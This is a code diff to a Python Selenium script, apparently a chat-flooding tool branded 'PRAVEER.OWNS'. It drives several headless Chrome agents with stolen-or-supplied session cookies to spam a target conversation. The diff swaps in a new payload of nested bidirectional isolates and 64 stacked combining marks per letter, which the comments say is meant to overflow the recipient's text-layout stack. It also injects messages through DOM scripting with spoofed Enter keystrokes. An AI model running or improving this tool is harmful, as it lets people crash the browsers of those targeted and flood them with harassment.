@@ -1,6 +1,6 @@
 # -*- coding: utf-8 -*-
-# 🚀 PROJECT: PRAVEER.OWNS (HEAP-SHATTER V73)
-# 📅 STATUS: RAM-SATURATION-ACTIVE | 4-AGENT TOTAL | AWS-HARD-KILL
+# 🚀 PROJECT: PRAVEER.OWNS (RECURSIVE-NUCLEAR V66)
+# 📅 STATUS: HARFBUZZ-STACK-OVERFLOW | 4-AGENT TOTAL | AWS-CPU-KILL
 
 import os, time, re, random, datetime, threading, sys, gc, tempfile, subprocess, shutil
 from concurrent.futures import ThreadPoolExecutor
@@ -12,7 +12,7 @@ from selenium.webdriver.chrome.options import Options
 # --- 4 AGENTS TOTAL CONFIG ---
 AGENTS_PER_MACHINE = 2             
 TOTAL_DURATION = 25000 
-BURST_SPEED = (0.1, 0.4)    # 🛡️ Optimized for socket delivery
+BURST_SPEED = (0.1, 0.4)    # 🔥 High-Frequency Injection
 REST_AFTER_STRIKES = 150   
 REST_DURATION = 3          
 
@@ -20,21 +20,26 @@ GLOBAL_SENT = 0
 COUNTER_LOCK = threading.Lock()
 BROWSER_LAUNCH_LOCK = threading.Lock()
 
-def get_heap_shatter_payload():
-    """Generates unique high-entropy data that forces new memory allocation."""
+def get_recursive_nuclear_payload():
+    """Generates a payload that targets the recursive limits of the layout engine."""
     u_id = random.randint(100, 999)
-    # 𒀱 = Cuneiform | ﷽ = Wide Ligature | 𒈙 = Complexity
-    heavy_pool = ["𒀱", "﷽", "𒈙", "𒈓", "𒈔", "🌙", "👑", "𝕻"]
+    
+    # \u2066 = LRI | \u2067 = RLI | \u2069 = PDI (Isolates)
+    # \u0300-\u036F = Combining Marks (Diacritics)
+    lri, rli, pdi = "\u2066", "\u2067", "\u2069"
+    marks = "".join([chr(i) for i in range(0x0300, 0x0340)]) # 64 stacked marks
     glue = "\u2060" # Word Joiner
     
-    header = f"👑 PRAVEER PAPA ON TOP 🌙 [SHATTER_ID:{u_id}]"
+    header = f"👑 PRAVEER PAPA ON TOP 🌙 [FINAL_LOCK:{u_id}]"
     
     body = []
-    # 440 lines of unique, non-compressible memory blocks
-    for i in range(440):
-        # We shuffle the pool for every single line to prevent 'String Interning'
-        random.shuffle(heavy_pool)
-        line = f"PRAVEER PAPA {''.join(heavy_pool * 6)} {i}{glue*5}"
+    # 400 lines of 'Recursive Stack Thrashing'
+    for i in range(400):
+        # We nest isolates 5 levels deep per line.
+        # This forces the browser to open 5 new 'Rendering Contexts' for every word.
+        # Then we stack 64 diacritics on the characters.
+        nest = f"{lri}{rli}{lri}{rli}{lri}P{marks}R{marks}A{marks}V{marks}EER{pdi*5}"
+        line = f"{nest} PAPA ON TOP 🌙 {i}{glue*8}"
         body.append(line)
         
     return f"{header}\n{glue.join(body)}".strip()[:9998]
@@ -45,8 +50,7 @@ def get_driver(agent_id):
         chrome_options.add_argument("--headless=new") 
         chrome_options.add_argument("--no-sandbox") 
         chrome_options.add_argument("--disable-dev-shm-usage")
-        chrome_options.add_argument("--disable-gpu") 
-        chrome_options.add_argument("--blink-settings=imagesEnabled=false")
+        chrome_options.add_argument("--disable-gpu")
         chrome_options.binary_location = "/usr/bin/google-chrome"
         
         ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36"
@@ -57,20 +61,16 @@ def get_driver(agent_id):
         return driver
 
 def atomic_dispatch_send(driver, text):
-    """Forces the message out by bypassing the UI thread priority queue."""
+    """Zero-latency DOM injection with hardware-event spoofing."""
     try:
         driver.execute_script("""
             var box = document.querySelector('div[role="textbox"], textarea');
             if (box) {
                 box.focus();
-                // 1. Reset the box state
                 document.execCommand('selectAll', false, null);
                 document.execCommand('delete', false, null);
-                // 2. Inject heavy payload
                 document.execCommand('insertText', false, arguments[0]);
-                // 3. Force state synchronization
                 box.dispatchEvent(new Event('input', { bubbles: true }));
-                // 4. Fire high-priority 'Enter' command
                 var e = new KeyboardEvent('keydown', {
                     key: 'Enter', code: 'Enter', keyCode: 13, which: 13, 
                     bubbles: true, cancelable: true
@@ -92,17 +92,17 @@ def run_life_cycle(agent_id, cookie, target):
             
             strike_count = 0
             while True:
-                payload = get_heap_shatter_payload()
+                payload = get_recursive_nuclear_payload()
                 if atomic_dispatch_send(driver, payload):
                     strike_count += 1
                     with COUNTER_LOCK:
                         global GLOBAL_SENT
                         GLOBAL_SENT += 1
-                    print(f"Agent {agent_id}: Shatter-Strike ({GLOBAL_SENT})")
+                    print(f"Agent {agent_id}: Final-Nuclear-Strike ({GLOBAL_SENT})")
                     
-                    if strike_count % 60 == 0:
+                    if strike_count % 50 == 0:
                         driver.refresh()
-                        time.sleep(8)
+                        time.sleep(10)
                 time.sleep(random.uniform(*BURST_SPEED))
         except: pass
         finally:
